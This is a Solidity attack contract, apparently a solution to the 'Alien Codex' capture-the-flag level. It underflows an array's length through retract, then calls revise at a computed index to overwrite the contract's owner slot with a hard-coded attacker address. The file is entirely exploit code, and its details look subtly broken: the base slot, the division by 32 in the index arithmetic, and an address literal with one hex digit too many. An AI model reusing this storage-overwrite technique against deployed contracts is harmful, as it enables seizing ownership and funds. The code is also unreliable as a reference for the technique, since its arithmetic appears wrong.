pragma solidity ^0.5.0;

interface AlienCodexInterface {
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 content) external;
}

contract AlienCodexAttack {
    function attack(address instance) public {
        AlienCodexInterface alien = AlienCodexInterface(instance);
        alien.makeContact();
        alien.retract();

        // Compute codex array's base storage slot (keccak256(2))
        uint codexBaseSlot = 2;
        bytes32 baseHash = keccak256(abi.encodePacked(codexBaseSlot));
        uint i = (uint(0) - uint(baseHash)) / 32;

        // Convert attacker address to bytes32 safely
        bytes32 attackerBytes = bytes32(uint256(0x0f39Fd6e51aad88F6F4ce6aB8827279cffFb92266));
        alien.revise(i, attackerBytes);
    }
}